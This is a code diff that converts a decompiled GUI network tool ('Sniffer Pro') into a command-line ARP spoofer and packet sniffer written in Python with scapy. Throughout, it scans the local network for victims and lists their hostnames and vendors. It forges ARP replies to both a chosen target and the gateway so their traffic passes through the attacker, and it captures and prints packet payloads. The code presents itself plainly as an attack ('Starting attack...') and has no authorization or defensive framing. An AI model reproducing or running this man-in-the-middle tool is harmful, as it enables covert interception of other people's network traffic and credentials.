@@ -1,5 +1,3 @@
-import customtkinter as ctk
-import tkinter.messagebox
 import threading
 import time
 import socket
@@ -13,33 +11,39 @@ import ipaddress
 import concurrent.futures
 import hashlib
 from time import sleep
-from datetime import datetime, UTC
 from datetime import datetime
 from scapy.all import get_if_hwaddr, get_if_addr, ARP, Ether, sendp, sniff, conf, srp
 import psutil
+
 try:
     import requests
 except ImportError:
     requests = None
-ctk.set_appearance_mode('dark')
-ctk.set_default_color_theme('dark-blue')
-BG_COLOR = '#000000'
-TEXT_COLOR = '#25ffa8'
-FONT = ('Consolas', 15, 'bold')
-FONT_TITLE = ('Consolas', 23, 'bold')
+
+# Color codes for terminal output
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 def get_available_interfaces():
-    # ***<module>.get_available_interfaces: Failure: Different bytecode
     return [iface for iface in psutil.net_if_addrs().keys() if not iface.lower().startswith('loopback')]
+
 def get_default_interface():
-    # ***<module>.get_default_interface: Failure: Different control flow
     try:
         stats = psutil.net_if_stats()
     except Exception:
         pass
     interfaces = get_available_interfaces()
     return interfaces[0] if interfaces else ''
+
 def get_local_ip():
-    # ***<module>.get_local_ip: Failure: Different bytecode
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         s.connect(('8.8.8.8', 80))
@@ -49,9 +53,10 @@ def get_local_ip():
     finally:
         s.close()
     return ip
+
 def guess_net(ip, prefix=24):
-    # ***<module>.guess_net: Failure: Different bytecode
     return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))
+
 def arp_scan_scapy(cidr):
     try:
         conf.verb = 0
@@ -65,8 +70,8 @@ def arp_scan_scapy(cidr):
         return results
     except Exception as e:
         raise RuntimeError('Scapy ARP scan failed') from e
+
 def ping_once(ip):
-    # ***<module>.ping_once: Failure: Different bytecode
     system = platform.system().lower()
     if system == 'windows':
         cmd = ['ping', '-n', '1', '-w', '1000', ip]
@@ -79,6 +84,7 @@ def ping_once(ip):
     except Exception:
         return False
     return True
+
 def parse_arp_table():
     system = platform.system().lower()
     entries = []
@@ -86,16 +92,12 @@ def parse_arp_table():
         if system == 'windows':
             out = subprocess.check_output(['arp', '-a'], text=True, stderr=subprocess.DEVNULL)
             for line in out.splitlines():
-                # Windows ARP output format: Interface: 192.168.1.100 --- 0x3
-                # Internet Address      Physical Address      Type
-                # 192.168.1.1           aa-bb-cc-dd-ee-ff     dynamic
                 m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2})', line, re.I)
                 if m:
                     ip = m.group(1)
                     mac = m.group(2).replace('-', ':')
                     entries.append({'ip': ip, 'mac': mac})
         else:
-            # Linux/Mac ARP output format
             out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
             for line in out.splitlines():
                 m = re.search(r'(\d+\.\d+\.\d+\.\d+).*?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
@@ -103,10 +105,10 @@ def parse_arp_table():
                     ip = m.group(1)
                     mac = m.group(2)
                     entries.append({'ip': ip, 'mac': mac})
-    except Exception as e:
-        # If there's an error, just return empty list
+    except Exception:
         pass
     return entries
+
 def sweep_network_ping(cidr, max_workers=200):
     try:
         net = ipaddress.ip_network(cidr, strict=False)
@@ -200,49 +202,69 @@ def enrich_entry(entry):
     res['netbios'] = netbios_name_lookup(ip)
     res['vendor'] = get_vendor_from_mac_api(mac) if mac else None
     return res
-class MITMInterface(ctk.CTk):
-    # ***<module>.MITMInterface: Failure: Different bytecode
+
+class ARPSpoofer:
     def __init__(self):
-        # ***<module>.MITMInterface.__init__: Failure: Different bytecode
-        super().__init__()
-        self.configure(fg_color='#000000')
-        self.title('Sniffer Pro v1.0')
-        self.geometry('1400x900')
-        self.minsize(1100, 700)
-        self.protocol('WM_DELETE_WINDOW', self.quit)
         self.stop_event = threading.Event()
-        self.log_queue = queue.Queue()
-        self.packet_queue = queue.Queue()
-        self.lock = threading.Lock()
         self.interfaces = get_available_interfaces()
         default_iface = get_default_interface()
-        self.config = {'target_ip': '', 'gateway_ip': '', 'target_mac': '', 'gateway_mac': '', 'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '', 'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER'], 'sniff_all': False}
+        self.config = {
+            'target_ip': '',
+            'gateway_ip': '',
+            'target_mac': '',
+            'gateway_mac': '',
+            'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
+            'sniff_all': False
+        }
         self.local_mac = None
         self.local_ip = None
         self.attack_thread = None
         self.capture_thread = None
-        self.grid_rowconfigure(0, weight=22)
-        self.grid_rowconfigure(1, weight=1)
-        self.grid_columnconfigure(0, weight=3)
-        self.grid_columnconfigure(1, weight=4)
-        self.grid_columnconfigure(2, weight=2)
-        self.setup_ui()
-        self.after(150, self.log_worker)
-        self.after(300, self.flush_packets)
-        self.detect_network()
+        self.packet_count = 0
+        
+    def clear_screen(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+    
+    def print_banner(self):
+        banner = f"""
+{Colors.GREEN}{Colors.BOLD}
+╔══════════════════════════════════════════════════════════╗
+║                 ARP SPOOFER / NETWORK SNIFFER            ║
+║                      Command Line Version                ║
+╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
+        """
+        print(banner)
+    
+    def print_status(self, message, level="INFO"):
+        timestamp = datetime.now().strftime('%H:%M:%S')
+        if level == "INFO":
+            color = Colors.CYAN
+        elif level == "SUCCESS":
+            color = Colors.GREEN
+        elif level == "WARNING":
+            color = Colors.WARNING
+        elif level == "ERROR":
+            color = Colors.FAIL
+        elif level == "SPOOF":
+            color = Colors.BLUE
+        else:
+            color = Colors.ENDC
+        
+        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")
+    
     def detect_gateway(self):
         gw_ip = None
         try:
             if platform.system() == 'Windows':
                 routes = subprocess.check_output('route print', shell=True).decode('mbcs', errors='ignore')
                 for line in routes.splitlines():
-                    m = re.match('\\s*0\\.0\\.0\\.0\\s+0\\.0\\.0\\.0\\s+([0-9]{1,3}(?:\\.[0-9]{1,3}){3})\\s', line)
+                    m = re.match(r'\s*0\.0\.0\.0\s+0\.0\.0\.0\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})\s', line)
                     if m:
                         gw_ip = m.group(1)
                         return gw_ip
             else:
                 result = subprocess.check_output(['ip', 'route']).decode()
-                m = re.search('default via ([0-9]{1,3}(?:\\.[0-9]{1,3}){3})', result)
+                m = re.search(r'default via ([0-9]{1,3}(?:\.[0-9]{1,3}){3})', result)
                 if m:
                     gw_ip = m.group(1)
                     return gw_ip
@@ -259,57 +281,54 @@ class MITMInterface(ctk.CTk):
             
             for line in result.splitlines():
                 if ip in line:
-                    mac = re.search('([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
+                    mac = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                     if mac:
                         return mac.group(0).replace('-', ':')
         except Exception:
             return ''
         return ''
+    
     def detect_network(self):
         try:
-            self.config['iface'] = self.iface_var.get()
             self.local_ip = get_if_addr(self.config['iface'])
             self.local_mac = get_if_hwaddr(self.config['iface'])
-            self.log(f'[AUTO] Interface used: {self.config["iface"]}')
-            self.log(f'[AUTO] Local IP: {self.local_ip}')
-            self.log(f'[AUTO] Local MAC: {self.local_mac}')
+            self.print_status(f"Interface used: {self.config['iface']}", "SUCCESS")
+            self.print_status(f"Local IP: {self.local_ip}", "SUCCESS")
+            self.print_status(f"Local MAC: {self.local_mac}", "SUCCESS")
+            
             gw_ip = self.detect_gateway()
             if gw_ip:
                 self.config['gateway_ip'] = gw_ip
-                self.gateway_ip_entry.delete(0, 'end')
-                self.gateway_ip_entry.insert(0, gw_ip)
-                self.log(f'[AUTO] Gateway IP: {gw_ip}')
+                self.print_status(f"Gateway IP: {gw_ip}", "SUCCESS")
                 gw_mac = self.find_mac_for_ip(gw_ip)
                 if gw_mac:
                     self.config['gateway_mac'] = gw_mac
-                    self.gateway_mac_entry.delete(0, 'end')
-                    self.gateway_mac_entry.insert(0, gw_mac)
-                    self.log(f'[AUTO] Gateway MAC: {gw_mac}')
+                    self.print_status(f"Gateway MAC: {gw_mac}", "SUCCESS")
                 else:
-                    self.log('[AUTO] Could not find gateway MAC')
+                    self.print_status("Could not find gateway MAC", "WARNING")
             else:
-                self.log('[AUTO] Could not find gateway IP via routing')
-            self.scan_ip_targets()
+                self.print_status("Could not find gateway IP via routing", "WARNING")
         except Exception as e:
-            self.log(f'[ERROR] Network detection: {e}')
+            self.print_status(f"Network detection error: {e}", "ERROR")
+    
     def scan_ip_targets(self):
-        # ***<module>.MITMInterface.scan_ip_targets: Failure: Compilation Error
         try:
             local_ip = get_local_ip()
             if not local_ip:
-                self.log('[ERROR] Could not determine local IP')
-                return
+                self.print_status("Could not determine local IP", "ERROR")
+                return []
             else:
                 cidr = guess_net(local_ip, prefix=24)
-                self.log(f'[AUTO] Scanning network: {cidr}')
+                self.print_status(f"Scanning network: {cidr}", "INFO")
                 results = []
                 try:
                     results = arp_scan_scapy(cidr)
-                    self.log(f'[AUTO] ARP scan (scapy): {len(results)} hosts found')
+                    self.print_status(f"ARP scan (scapy): {len(results)} hosts found", "SUCCESS")
                 except Exception:
-                    self.log('[AUTO] Scapy unavailable or not root, falling back to ping sweep')
+                    self.print_status("Scapy unavailable or not root, falling back to ping sweep", "WARNING")
                     results = sweep_network_ping(cidr)
-                    self.log(f'[AUTO] Ping sweep: {len(results)} responsive hosts found')
+                    self.print_status(f"Ping sweep: {len(results)} responsive hosts found", "INFO")
+                
                 enriched = []
                 with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
                     futures = [ex.submit(enrich_entry, r) for r in results]
@@ -318,165 +337,153 @@ class MITMInterface(ctk.CTk):
                             enriched.append(fut.result())
                         except Exception:
                             pass
+                
                 enriched_sorted = sorted(enriched, key=lambda x: x.get('ip') or '')
-                if enriched_sorted:
-                    self.log('[AUTO] TARGET IPs and MACs:')
-                    self.log(f'{"IP":16} {"MAC":18} {"Hostname":30} {"NetBIOS/mDNS":20} {"Vendor"}')
-                    for e in enriched_sorted:
-                        ip = e.get('ip') or '-'
-                        mac = e.get('mac') or '-'
-                        hn = e.get('hostname') or '-'
-                        nb = e.get('netbios') or '-'
-                        vendor = e.get('vendor') or '-'
-                        if ip != self.config.get('gateway_ip', ''):
-                            self.log(f'{ip:16} {mac:18} {hn:30} {nb:20} {vendor}')
-                else:
-                    self.log('[AUTO] No target devices detected on the network')
+                return enriched_sorted
         except Exception as e:
-            self.log(f'[ERROR] Target IP scan: {e}')
-    def validate_ip(self, ip):
-        # ***<module>.MITMInterface.validate_ip: Failure: Different bytecode
-        return re.match('^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$', ip) and all((0 <= int(x) <= 255 for x in ip.split('.')))
-    def validate_mac(self, mac):
-        # ***<module>.MITMInterface.validate_mac: Failure: Different bytecode
-        return re.match('^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac)
-    def setup_ui(self):
-        # ***<module>.MITMInterface.setup_ui: Failure: Different bytecode
-        left = ctk.CTkFrame(self, fg_color=BG_COLOR)
-        left.grid(row=0, column=0, sticky='nsew', padx=6, pady=(6, 2))
-        ctk.CTkLabel(left, text='OPERATIONAL LOGS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
-        self.log_text = ctk.CTkTextbox(left, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='word')
-        self.log_text.pack(fill='both', expand=True)
-        center = ctk.CTkFrame(self, fg_color=BG_COLOR)
-        center.grid(row=0, column=1, sticky='nsew', padx=6, pady=(6, 2))
-        ctk.CTkLabel(center, text='CAPTURED PACKETS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
-        self.packet_tree = ctk.CTkTextbox(center, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='none', height=33)
-        self.packet_tree.pack(fill='both', expand=True)
-        right = ctk.CTkFrame(self, fg_color=BG_COLOR)
-        right.grid(row=0, column=2, sticky='nsew', padx=6, pady=(6, 2))
-        ctk.CTkLabel(right, text='CONFIGURATION', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
-        config_frame = ctk.CTkFrame(right, fg_color=BG_COLOR)
-        config_frame.pack(fill='both', expand=True)
-        labels = ['Target IP:', 'Gateway IP:', 'Target MAC:', 'Gateway MAC:', 'Protocols:']
-        entries = []
-        for label in labels:
-            row = ctk.CTkFrame(config_frame, fg_color=BG_COLOR)
-            row.pack(fill='x', pady=10)
-            ctk.CTkLabel(row, text=label, font=FONT, text_color=TEXT_COLOR, width=170, anchor='w').pack(side='left')
-            entry = ctk.CTkEntry(row, font=FONT, width=260, fg_color='#000000')
-            entry.pack(side='left', padx=16)
-            entries.append(entry)
-        self.target_ip_entry, self.gateway_ip_entry, self.target_mac_entry, self.gateway_mac_entry, self.proto_entry = entries
-        row_iface = ctk.CTkFrame(config_frame, fg_color=BG_COLOR)
-        row_iface.pack(fill='x', pady=10)
-        ctk.CTkLabel(row_iface, text='Interface:', font=FONT, text_color=TEXT_COLOR, width=170, anchor='w').pack(side='left')
-        self.iface_var = ctk.StringVar(value=self.config['iface'])
-        self.iface_menu = ctk.CTkOptionMenu(row_iface, variable=self.iface_var, values=self.interfaces, font=FONT, width=260, fg_color='#000000', button_color='#000000', button_hover_color='#333333')
-        self.iface_menu.pack(side='left', padx=16)
-        self.sniff_all_var = ctk.BooleanVar(value=False)
-        self.sniff_all_check = ctk.CTkCheckBox(config_frame, text='Sniff entire network', variable=self.sniff_all_var, font=FONT, text_color=TEXT_COLOR, fg_color='#000000', hover_color='#333333')
-        self.sniff_all_check.pack(pady=10)
-        self.proto_entry.insert(0, 'HTTP,TCP,UDP,OTHER')
-        bottom = ctk.CTkFrame(self, fg_color=BG_COLOR, height=80)
-        bottom.grid(row=1, column=0, columnspan=3, sticky='ew', padx=6, pady=(3, 10))
-        btn_frame = ctk.CTkFrame(bottom, fg_color=BG_COLOR)
-        btn_frame.pack(expand=True)
-        self.start_btn = ctk.CTkButton(btn_frame, text='START', command=self.start_attack, font=FONT, fg_color='#25ffa8', hover_color='#1dd88a', text_color='#FF0000', width=180, height=50)
-        self.start_btn.pack(side='left', padx=18)
-        self.stop_btn = ctk.CTkButton(btn_frame, text='STOP', command=self.stop_attack, state='disabled', font=FONT, fg_color='#25ffa8', hover_color='#ff6b81', text_color='#FF0000', text_color_disabled='#FF0000', width=180, height=50)
-        self.stop_btn.pack(side='left', padx=18)
-        ctk.CTkButton(btn_frame, text='SAVE', command=self.save_config, font=FONT, fg_color='#25ffa8', hover_color='#1db4fa', text_color='#FF0000', width=180, height=50).pack(side='left', padx=18)
-        ctk.CTkButton(btn_frame, text='QUIT', command=self.quit, font=FONT, fg_color='#25ffa8', hover_color='#e07b00', text_color='#FF0000', width=180, height=50).pack(side='right', padx=18)
-        self.status_var = ctk.StringVar(value='READY')
-        ctk.CTkLabel(bottom, textvariable=self.status_var, text_color='#FF0000', font=FONT_TITLE, anchor='w').pack(side='left', padx=24)
-    def log(self, msg):
-        # ***<module>.MITMInterface.log: Failure: Different bytecode
-        timestamp = datetime.now().strftime('%H:%M:%S')
-        self.log_queue.put(f'[{timestamp}] {msg}')
-    def log_worker(self):
-        # ***<module>.MITMInterface.log_worker: Failure: Different control flow
-        while True:
-            try:
-                msg = self.log_queue.get_nowait()
-                if lines > 200:
-                    self.log_text.delete('1.0', '50.0')
-            except queue.Empty:
-                pass
-                self.after(150, self.log_worker)
-    def save_config(self):
-        try:
-            self.config['target_ip'] = self.target_ip_entry.get().strip()
-            self.config['gateway_ip'] = self.gateway_ip_entry.get().strip()
-            self.config['target_mac'] = self.target_mac_entry.get().strip().upper().replace('-', ':')
-            self.config['gateway_mac'] = self.gateway_mac_entry.get().strip().upper().replace('-', ':')
-            self.config['iface'] = self.iface_var.get()
-            self.config['sniff_all'] = self.sniff_all_var.get()
-            proto_input = [p.strip().upper() for p in self.proto_entry.get().split(',')]
-            self.config['protocols'] = [p for p in proto_input if p in ['HTTP', 'TCP', 'UDP', 'OTHER']] or ['HTTP', 'TCP', 'UDP', 'OTHER']
-            
-            self.log(f'[CONFIG] Target IP: {self.config["target_ip"]}')
-            self.log(f'[CONFIG] Target MAC: {self.config["target_mac"]}')
-            self.log(f'[CONFIG] Gateway IP: {self.config["gateway_ip"]}')
-            self.log(f'[CONFIG] Gateway MAC: {self.config["gateway_mac"]}')
-            self.log(f'[CONFIG] Interface: {self.config["iface"]}')
-            self.log(f'[CONFIG] Full Sniff Mode: {"Enabled" if self.config["sniff_all"] else "Disabled"}')
-            
-            if not self.config['sniff_all']:
-                if not self.validate_ip(self.config['target_ip']):
-                    raise ValueError('Invalid target IP')
-                if not self.validate_ip(self.config['gateway_ip']):
-                    raise ValueError('Invalid gateway IP')
-                if not self.validate_mac(self.config['target_mac']):
-                    raise ValueError('Invalid target MAC')
-                if not self.validate_mac(self.config['gateway_mac']):
-                    raise ValueError('Invalid gateway MAC')
-            
-            self.log('[CONFIG] Parameters validated and saved')
-        except Exception as e:
-            self.log(f'[ERROR] Config: {e}')
-
-    def start_attack(self):
-        if self.attack_thread and self.attack_thread.is_alive():
+            self.print_status(f"Target IP scan error: {e}", "ERROR")
+            return []
+    
+    def display_targets(self, targets):
+        if not targets:
+            self.print_status("No target devices detected on the network", "WARNING")
             return
         
-        self.save_config()
-        self.log(f'[START] Full Sniff Mode: {"Enabled" if self.config["sniff_all"] else "Disabled"}')
+        print(f"\n{Colors.BOLD}{Colors.GREEN}Available Targets:{Colors.ENDC}")
+        print(f"{'ID':<4} {'IP':<16} {'MAC':<18} {'Hostname':<30} {'Vendor':<20}")
+        print("-" * 90)
         
-        if not self.config['sniff_all']:
-            self.log(f'[START] Target IP: {self.config["target_ip"]}')
-            self.log(f'[START] Target MAC: {self.config["target_mac"]}')
-            self.log(f'[START] Gateway IP: {self.config["gateway_ip"]}')
-            self.log(f'[START] Gateway MAC: {self.config["gateway_mac"]}')
+        for i, e in enumerate(targets):
+            ip = e.get('ip') or '-'
+            mac = e.get('mac') or '-'
+            hn = (e.get('hostname') or '-')[:28]
+            vendor = (e.get('vendor') or '-')[:18]
+            print(f"{i:<4} {ip:<16} {mac:<18} {hn:<30} {vendor:<20}")
+        print()
+    
+    def validate_ip(self, ip):
+        try:
+            ipaddress.ip_address(ip)
+            return True
+        except:
+            return False
+    
+    def validate_mac(self, mac):
+        return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))
+    
+    def interactive_config(self):
+        self.clear_screen()
+        self.print_banner()
+        
+        # Interface selection
+        print(f"\n{Colors.BOLD}Available interfaces:{Colors.ENDC}")
+        for i, iface in enumerate(self.interfaces):
+            print(f"  {i+1}. {iface}")
+        
+        while True:
+            try:
+                choice = input(f"\n{Colors.CYAN}Select interface (1-{len(self.interfaces)}) [Default: 1]: {Colors.ENDC}").strip()
+                if not choice:
+                    idx = 0
+                else:
+                    idx = int(choice) - 1
+                
+                if 0 <= idx < len(self.interfaces):
+                    self.config['iface'] = self.interfaces[idx]
+                    break
+                else:
+                    print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
+            except ValueError:
+                print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
+        
+        # Auto-detect network
+        self.detect_network()
+        
+        # Scan for targets
+        targets = self.scan_ip_targets()
+        
+        if targets:
+            self.display_targets(targets)
             
-            if not all([self.config['target_ip'], self.config['gateway_ip'], self.config['target_mac'], self.config['gateway_mac']]):
-                self.log('[ERROR] Incomplete configuration')
-                return
+            # Mode selection
+            print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
+            print("  1. Sniff entire network")
+            print("  2. Target specific device (ARP spoofing)")
+            
+            while True:
+                mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 2]: {Colors.ENDC}").strip()
+                if not mode or mode == "2":
+                    self.config['sniff_all'] = False
+                    
+                    # Select target
+                    while True:
+                        try:
+                            target_id = input(f"{Colors.CYAN}Select target ID (0-{len(targets)-1}): {Colors.ENDC}").strip()
+                            if target_id and 0 <= int(target_id) < len(targets):
+                                target = targets[int(target_id)]
+                                self.config['target_ip'] = target['ip']
+                                self.config['target_mac'] = target['mac'] or ''
+                                break
+                            else:
+                                print(f"{Colors.FAIL}Invalid target ID{Colors.ENDC}")
+                        except ValueError:
+                            print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
+                    
+                    # Gateway is already detected
+                    break
+                elif mode == "1":
+                    self.config['sniff_all'] = True
+                    break
+                else:
+                    print(f"{Colors.FAIL}Invalid mode{Colors.ENDC}")
+        else:
+            # Manual configuration
+            self.print_status("No targets auto-detected, switching to manual mode", "WARNING")
+            self.config['sniff_all'] = False
+            
+            print(f"\n{Colors.BOLD}Manual Configuration:{Colors.ENDC}")
+            
+            # Target IP
+            while True:
+                ip = input(f"{Colors.CYAN}Target IP: {Colors.ENDC}").strip()
+                if self.validate_ip(ip):
+                    self.config['target_ip'] = ip
+                    break
+                print(f"{Colors.FAIL}Invalid IP address{Colors.ENDC}")
+            
+            # Target MAC
+            while True:
+                mac = input(f"{Colors.CYAN}Target MAC (format: aa:bb:cc:dd:ee:ff): {Colors.ENDC}").strip()
+                if self.validate_mac(mac):
+                    self.config['target_mac'] = mac
+                    break
+                print(f"{Colors.FAIL}Invalid MAC address{Colors.ENDC}")
+            
+            # Gateway IP
+            while True:
+                ip = input(f"{Colors.CYAN}Gateway IP: {Colors.ENDC}").strip()
+                if self.validate_ip(ip):
+                    self.config['gateway_ip'] = ip
+                    break
+                print(f"{Colors.FAIL}Invalid IP address{Colors.ENDC}")
+            
+            # Gateway MAC
+            while True:
+                mac = input(f"{Colors.CYAN}Gateway MAC (format: aa:bb:cc:dd:ee:ff): {Colors.ENDC}").strip()
+                if self.validate_mac(mac):
+                    self.config['gateway_mac'] = mac
+                    break
+                print(f"{Colors.FAIL}Invalid MAC address{Colors.ENDC}")
         
-        self.log(f'[START] Interface: {self.config["iface"]}')
-        self.stop_event.clear()
-        self.start_btn.configure(state='disabled')
-        self.stop_btn.configure(state='normal')
-        self.status_var.set('ATTACK IN PROGRESS')
-        
-        if not self.config['sniff_all']:
-            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
-            self.attack_thread.start()
-        
-        self.capture_thread = threading.Thread(target=self.real_capture, daemon=True)
-        self.capture_thread.start()
-        self.log('[ATTACK] Capture started' + (' with ARP Spoofing' if not self.config['sniff_all'] else ''))
-
-    def stop_attack(self):
-        self.stop_event.set()
-        self.start_btn.configure(state='normal')
-        self.stop_btn.configure(state='disabled')
-        self.status_var.set('STOPPED')
-        self.log('[ATTACK] Stopped')
-
-    def quit(self):
-        self.stop_event.set()
-        self.destroy()
-
+        # Protocol selection
+        print(f"\n{Colors.BOLD}Select protocols to capture (comma-separated):{Colors.ENDC}")
+        print("  Available: HTTP, TCP, UDP, OTHER")
+        proto_input = input(f"{Colors.CYAN}Protocols [Default: HTTP,TCP,UDP,OTHER]: {Colors.ENDC}").strip()
+        if proto_input:
+            self.config['protocols'] = [p.strip().upper() for p in proto_input.split(',')]
+        else:
+            self.config['protocols'] = ['HTTP', 'TCP', 'UDP', 'OTHER']
+    
     def arp_poison(self):
         try:
             target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
@@ -485,17 +492,16 @@ class MITMInterface(ctk.CTk):
             while not self.stop_event.is_set():
                 sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                 sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
-                self.log(f'[SPOOF] → Target IP: {self.config["target_ip"]}')
-                self.log(f'[SPOOF] → Target MAC: {self.config["target_mac"]}')
+                self.print_status(f"ARP spoofing: {self.config['target_ip']} ↔ {self.config['gateway_ip']}", "SPOOF")
                 
                 for _ in range(10):
                     if self.stop_event.is_set():
                         break
                     time.sleep(0.1)
         except Exception as e:
-            self.log(f'[ERROR SPOOF] {e}')
+            self.print_status(f"ARP spoofing error: {e}", "ERROR")
 
-    def real_capture(self):
+    def packet_capture(self):
         def packet_handler(pkt):
             if self.stop_event.is_set():
                 return
@@ -516,7 +522,7 @@ class MITMInterface(ctk.CTk):
                 data = ''
                 
                 if pkt.haslayer('TCP'):
-                    info = f'Port {pkt["TCP"].dport}'
+                    info = f"Port {pkt['TCP'].dport}"
                     if pkt.haslayer('Raw'):
                         payload = pkt['Raw'].load[:50]
                         try:
@@ -526,55 +532,58 @@ class MITMInterface(ctk.CTk):
                         except:
                             data = str(payload)
                 elif pkt.haslayer('UDP'):
-                    info = f'Port {pkt["UDP"].dport}'
+                    info = f"Port {pkt['UDP'].dport}"
                 
-                with self.lock:
-                    self.packet_queue.put({
-                        'ts': datetime.now().strftime('%H:%M:%S.%f')[:-3],
-                        'src': src,
-                        'dst': dst,
-                        'proto': proto_str,
-                        'info': info[:30],
-                        'data': data[:40] if data else 'N/A'
-                    })
+                self.packet_count += 1
+                timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+                print(f"{Colors.GREEN}[{timestamp}] {src} → {dst} | {proto_str} | {info} | {data[:30]}{Colors.ENDC}")
         
         try:
             sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
         except Exception as e:
-            self.log(f'[ERROR CAPTURE] {e}')
+            self.print_status(f"Capture error: {e}", "ERROR")
 
-    def flush_packets(self):
-        items = []
-        with self.lock:
-            try:
-                while True:
-                    pkt = self.packet_queue.get_nowait()
-                    items.append(pkt)
-            except queue.Empty:
-                pass
+    def start(self):
+        self.clear_screen()
+        self.print_banner()
         
-        if items:
-            for pkt in items:
-                line = f'{pkt["ts"]}  {pkt["src"]}  {pkt["dst"]}  {pkt["proto"]}  {pkt["info"]}  {pkt["data"]}\n'
-                self.packet_tree.insert('end', line)
-                self.packet_tree.see('end')
-            
-            lines = float(self.packet_tree.index('end-1c').split('.')[0])
-            if lines > 300:
-                self.packet_tree.delete('1.0', '101.0')
+        # Check permissions
+        if platform.system() != 'Windows' and hasattr(os, 'geteuid') and os.geteuid() != 0:
+            self.print_status("WARNING: Running without root/admin privileges may limit capture capabilities", "WARNING")
+            response = input(f"{Colors.WARNING}Continue anyway? (y/n): {Colors.ENDC}").strip().lower()
+            if response != 'y':
+                sys.exit(1)
         
-        self.after(300, self.flush_packets)
+        # Interactive configuration
+        self.interactive_config()
+        
+        # Start attack
+        self.print_status("Starting attack...", "INFO")
+        self.stop_event.clear()
+        
+        if not self.config['sniff_all']:
+            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
+            self.attack_thread.start()
+        
+        self.capture_thread = threading.Thread(target=self.packet_capture, daemon=True)
+        self.capture_thread.start()
+        
+        self.print_status(f"Capture started" + (" with ARP spoofing" if not self.config['sniff_all'] else ""), "SUCCESS")
+        print(f"\n{Colors.WARNING}Press Ctrl+C to stop...{Colors.ENDC}\n")
+        
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.stop()
+    
+    def stop(self):
+        self.print_status("Stopping attack...", "WARNING")
+        self.stop_event.set()
+        time.sleep(1)
+        self.print_status(f"Total packets captured: {self.packet_count}", "SUCCESS")
+        self.print_status("Attack stopped", "INFO")
 
 if __name__ == '__main__':
-    def clear_screen():
-        if os.name == 'posix':
-            os.system('clear')
-        else:
-            os.system('cls')
-    clear_screen()
-    
-    if platform.system() != 'Windows' and hasattr(os, 'geteuid') and os.geteuid() != 0:
-        tkinter.messagebox.showerror('Permission', 'Run as root/admin for real capture')
-    else:
-        app = MITMInterface()
-        app.mainloop()
+    spoofer = ARPSpoofer()
+    spoofer.start()
